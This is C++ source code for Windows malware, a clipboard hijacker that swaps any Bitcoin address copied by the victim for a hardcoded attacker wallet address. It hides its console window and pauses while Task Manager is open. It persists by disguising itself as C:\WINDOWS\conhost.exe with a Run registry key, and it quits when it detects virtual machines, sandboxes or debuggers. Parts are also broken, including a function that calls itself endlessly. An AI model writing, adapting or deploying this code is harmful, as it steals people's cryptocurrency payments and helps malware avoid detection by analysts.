#include <iostream>
#include <regex>
#include <Windows.h>
#include <string>
#include <shlwapi.h>
#include <Lmcons.h>
#include <iostream>
#include <windows.h>
#include <ShlObj.h>
#include <LM.h>
#include <TlHelp32.h>
#include <string.h>
#include <wchar.h>











bool IsUserAnAdmin() {
    BOOL isAdmin = false;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        if (CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
            if (isAdmin) {
                std::wcout << L"Running with administrative privileges." << std::endl;
            } else {
                std::wcout << L"Not running with administrative privileges." << std::endl;
            }
        }
        FreeSid(AdministratorsGroup);
    }

    return isAdmin == TRUE;
}



bool IsTaskManagerOpen() {
    HWND hwnd = FindWindowW(nullptr, L"Task Manager");
    return hwnd != NULL;
}

bool MoveToProgramsDirectory() {
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    if (PathFileExistsW(L"C:\\WINDOWS")) {
        std::wstring newFilePath = L"C:\\WINDOWS\\conhost.exe";

        if (MoveFileW(currentPath, newFilePath.c_str())) {
            HKEY hKey;
            if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                std::wstring appName = L"conhost"; // Desired name
                if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)newFilePath.c_str(), (newFilePath.length() + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
                    RegCloseKey(hKey);
                    return true;
                }
                RegCloseKey(hKey);
            }
        }
    }

    return false;
}

bool DetectVirtualMachine() {
    const wchar_t* vmArtifacts[] = {
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SYSTEM\\ControlSet001\\Services\\VBoxMouse",
        L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        L"SYSTEM\\ControlSet001\\Services\\Disk\\Enum",
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SYSTEM\\ControlSet001\\Services\\VMTools",
        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters\\PhysicalHostName",
        L"HARDWARE\\Description\\System\\SystemBiosVersion",
        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters\\HostName",
        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters\\VidPartitionTable"
    };

    
    const wchar_t* vmServices[] = {
        L"VBoxService",
        L"VBoxTray",
        L"VMTools",
        L"VMware Physical Disk Helper Service",
        L"vmmemctl",
        L"qemu-ga",
        L"xensvc",
        L"hypervtools",
        L"XENBUS",
        L"VMSMP"
    };

    for (const wchar_t* artifact : vmArtifacts) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, artifact, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);  
    if (scm) {
        for (const wchar_t* service : vmServices) {
            SC_HANDLE serviceHandle = OpenServiceW(scm, service, SERVICE_QUERY_STATUS);  
            if (serviceHandle) {
                CloseServiceHandle(serviceHandle);
                CloseServiceHandle(scm);
                return true;
            }
        }
        CloseServiceHandle(scm);
    }



    return false;
}



bool IsKnownSandboxProcess();
bool IsVirtualizationEnabled();
bool HasSandboxEnvironmentVariables();
bool HasLowLevelSystemInfo();







bool DetectSandbox() {
    // Check for the presence of common sandbox artifacts
    if (GetModuleHandleW(L"cmdvrt32.dll") != NULL) {
        return true;
    }

    if (GetModuleHandleW(L"SxIn.dll") != NULL) {
        return true;
    }

    if (GetModuleHandleW(L"SbieDll.dll") != NULL) {
        return true;
    }


    if (IsKnownSandboxProcess()) {
        return true;
    }


    if (IsVirtualizationEnabled()) {
        return true;
    }


    if (IsDebuggerPresent()) {
        return true;
    }

    if (HasSandboxEnvironmentVariables()) {
        return true;
    }

    if (HasLowLevelSystemInfo()) {
        return true;
    }

    return false;
}


int _wcsicmp(const wchar_t* string1, const wchar_t* string2) {
    return _wcsicmp(string1, string2);
}


// Function to check for known sandbox processes
bool IsKnownSandboxProcess() {
    // List of known sandbox processes to check for
    const wchar_t* sandboxProcesses[] = {
    L"vmware.exe",
    L"vboxservice.exe",
    L"vboxtray.exe",
    L"vmtoolsd.exe",
    L"vmacthlp.exe",
    L"vmsrvc.exe",      // VMware service process
    L"vmnat.exe",       // VMware network process
    L"vmmouse.exe",     // VMware mouse process
    L"vmusbmouse.exe",  // VMware USB mouse process
    L"vmscsi.exe",      // VMware SCSI process
    L"vmxnet.exe",      // VMware network adapter process
    L"vmauthd.exe",     // VMware authorization service
    L"vmware-vmx.exe",  // VMware virtual machine monitor
    L"vboxguest.exe",   // VirtualBox Guest Additions
    L"vboxtray.exe",    // VirtualBox system tray
    L"vboxdisp.exe",    // VirtualBox Display Manager
    L"vboxusbmon.exe",  // VirtualBox USB monitor
    L"vboxheadless.exe",// VirtualBox headless VM process
    L"vboxmanage.exe",  // VirtualBox management tool
    L"vboxmmanage.exe", // VirtualBox Multisession Manager
    L"vboxsgr.exe",     // VirtualBox Seamless Graphics
    L"qemu-ga.exe",     // QEMU Guest Agent
    L"qemu-system-x86_64.exe", // QEMU system process
    L"vz.exe",          // Virtuozzo
    L"prl_cc.exe",      // Parallels Desktop Control Center
    L"prl_tools.exe",   // Parallels Tools Service

};


    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;  

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;
    }

    if (Process32FirstW(hProcessSnap, &pe32)) {  
        do {
            for (const wchar_t* sandboxProcess : sandboxProcesses) {
               
                if (wcscmp(pe32.szExeFile, sandboxProcess) == 0) {
                    CloseHandle(hProcessSnap);
                    return true;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32)); 
    }

    CloseHandle(hProcessSnap);
    return false;
}




bool IsVirtualizationEnabled() {
    int cpuidData[4] = { 0 };
    __asm__ __volatile__("cpuid"
                         : "=a" (cpuidData[0]), "=b" (cpuidData[1]), "=c" (cpuidData[2]), "=d" (cpuidData[3])
                         : "a" (1), "c" (0));

    
    bool intelVTXSupported = (cpuidData[2] & (1 << 5)) != 0;
    bool amdVSupported = (cpuidData[2] & (1 << 6)) != 0;

    if (intelVTXSupported || amdVSupported) {
        return true;
    }

    return false;
}

bool HasSandboxEnvironmentVariables() {
    const char* sandboxEnvVariables[] = {
        "Sandboxie",
        "XEN",
        "VBOX",
        "VMWARE",
        "QEMU",
        "GDBG",
       
    };

    for (const char* envVariable : sandboxEnvVariables) {
        if (getenv(envVariable) != NULL) {
            return true;
        }
    }

    return false;
}


bool HasLowLevelSystemInfo() {

    unsigned int eax, ebx, ecx, edx;


    __asm__ __volatile__("cpuid" : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx) : "a" (0));
    char vendorString[13];
    memcpy(vendorString, &ebx, 4);
    memcpy(vendorString + 4, &edx, 4);
    memcpy(vendorString + 8, &ecx, 4);
    vendorString[12] = '\0';


    if (strcmp(vendorString, "VMwareVMware") == 0 ||
        strcmp(vendorString, "KVMKVMKVM") == 0 ||
        strcmp(vendorString, "Microsoft Hv") == 0) {
        return true;
    }


    unsigned long long start, end;
    __asm__ __volatile__("rdtsc" : "=A" (start));
    Sleep(1000); // Sleep for 1 second
    __asm__ __volatile__("rdtsc" : "=A" (end));


    if ((end - start) < 1000000) {
        return true;
    }



    return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsUserAnAdmin()) {
        MessageBoxW(NULL, L"Please run the program as an administrator.", L"Administrator Privileges Required", MB_ICONERROR | MB_OK);
        return 1; // Terminate the program
    }

    std::regex bitcoinAddressPattern("([13][a-km-zA-HJ-NP-Z1-9]{25,34})|(bc1[ac-hj-np-z02-9]{39,59})");
    std::string lastClipboardText;
    bool isTaskManagerOpen = false;

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE); // Hide console window


    while (true) {
        if (!isTaskManagerOpen) {
            if (IsTaskManagerOpen()) {
                isTaskManagerOpen = true;
            } else if (IsClipboardFormatAvailable(CF_TEXT) && OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* clipboardText = static_cast<char*>(GlobalLock(hData));
                    if (clipboardText && lastClipboardText != clipboardText) {
                        lastClipboardText = clipboardText;

                        if (std::regex_search(clipboardText, bitcoinAddressPattern)) {
                            std::string modifiedText = std::regex_replace(clipboardText, bitcoinAddressPattern, "bc1qj884lyzsat3v957cqefne9dnm0e378eesfk2pk");

                            if (OpenClipboard(NULL)) {
                                EmptyClipboard();
                                HGLOBAL hClipboardData = GlobalAlloc(GMEM_MOVEABLE, modifiedText.size() + 1);
                                if (hClipboardData) {
                                    char* pchData = static_cast<char*>(GlobalLock(hClipboardData));
                                    if (pchData) {
                                        strcpy(pchData, modifiedText.c_str());
                                        GlobalUnlock(hClipboardData);
                                        SetClipboardData(CF_TEXT, hClipboardData);
                                    }
                                }
                                CloseClipboard();
                            }
                        }
                    }
                    GlobalUnlock(hData);
                }
                CloseClipboard();
            }

            if (DetectVirtualMachine()) {
                std::wcout << L"Running in a virtual machine." << std::endl;
                return 1;
            }

            if (DetectSandbox()) {
                std::wcout << L"Running in a virtual machine or sandbox." << std::endl;
                return 1; // Terminate the program
            }
        } else {
            if (!IsTaskManagerOpen()) {
                isTaskManagerOpen = false;
            }
        }
        Sleep(100);
    }

    return 0;
}
